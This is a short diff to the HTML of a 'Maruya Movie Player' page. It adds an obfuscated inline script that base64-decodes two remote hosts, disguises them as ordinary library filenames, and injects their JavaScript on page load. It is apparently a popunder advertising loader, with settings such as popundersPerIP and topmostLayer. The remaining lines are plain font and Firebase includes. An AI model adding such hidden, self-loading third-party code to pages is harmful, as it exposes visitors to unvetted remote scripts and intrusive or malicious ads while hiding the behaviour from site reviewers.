@@ -6,7 +6,12 @@
     <title>Maruya Movie Player</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    
+    <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var d=window,k="d360679afa9257aa68f84736199f4520",j=[["siteId",269+136-116*90+5236163],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vdlNyTGYvcHlhbWwubWluLmpz","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvZWZWZWtPL3IveHpvb20ubWluLmNzcw=="],p=-1,l,w,s=function(){clearTimeout(w);p++;if(o[p]&&!(1780598579000<(new Date).getTime()&&1<p)){l=d.document.createElement("script");l.type="text/javascript";l.async=!0;var a=d.document.getElementsByTagName("script")[0];l.src="https://"+atob(o[p]);l.crossOrigin="anonymous";l.onerror=s;l.onload=function(){clearTimeout(w);d[k.slice(0,16)+k.slice(0,16)]||s()};w=setTimeout(s,5E3);a.parentNode.insertBefore(l,a)}};if(!d[k]){try{Object.freeze(d[k]=j)}catch(e){}s()}})();
+/*]]>/* */
+</script>
+
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
